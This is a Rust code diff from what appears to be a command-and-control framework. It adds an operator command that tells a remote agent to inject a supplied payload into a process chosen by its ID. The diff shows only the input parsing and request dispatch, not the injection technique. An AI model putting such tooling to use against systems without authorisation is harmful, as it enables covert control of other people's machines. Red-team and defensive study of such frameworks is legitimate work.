@@ -4,7 +4,10 @@ use chrono::{DateTime, Utc};
 use leptos::prelude::{Read, RwSignal, Update, Write, use_context};
 use shared::{
     task_types::{RegAddInner, RegQueryInner, RegType},
-    tasks::{AdminCommand, DELIM_FILE_DROP_METADATA, DotExInner, FileDropMetadata, WyrmResult},
+    tasks::{
+        AdminCommand, DELIM_FILE_DROP_METADATA, DotExInner, FileDropMetadata, InjectInner,
+        WyrmResult,
+    },
 };
 use thiserror::Error;
 
@@ -857,6 +860,41 @@ pub async fn run_static_wof(agent: &IsTaskingAgent, raw_input: String) -> Dispat
     Ok(Some(
         api_request(
             AdminCommand::StaticWof(ser),
+            agent,
+            None,
+            C2Url::Standard,
+            None,
+        )
+        .await?,
+    ))
+}
+
+pub async fn inject(agent: &IsTaskingAgent, raw_input: String) -> DispatchResult {
+    agent.has_agent_id()?;
+
+    let (payload, pid_as_string) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop)
+    {
+        Some(mut inner) => (take(&mut inner[0]), (take(&mut inner[1]))),
+        None => {
+            return Err(TaskingError::TaskDispatchError(
+                TaskDispatchError::BadTokens("Could not get data from tokens in move_file.".into()),
+            ));
+        }
+    };
+
+    let Ok(pid) = pid_as_string.parse::<u32>() else {
+        return Err(TaskingError::TaskDispatchError(
+            TaskDispatchError::BadTokens(format!(
+                "Could not parse PID to a u32. Got: {pid_as_string}"
+            )),
+        ));
+    };
+
+    let inner = InjectInner { payload, pid };
+
+    Ok(Some(
+        api_request(
+            AdminCommand::Inject(inner),
             agent,
             None,
             C2Url::Standard,
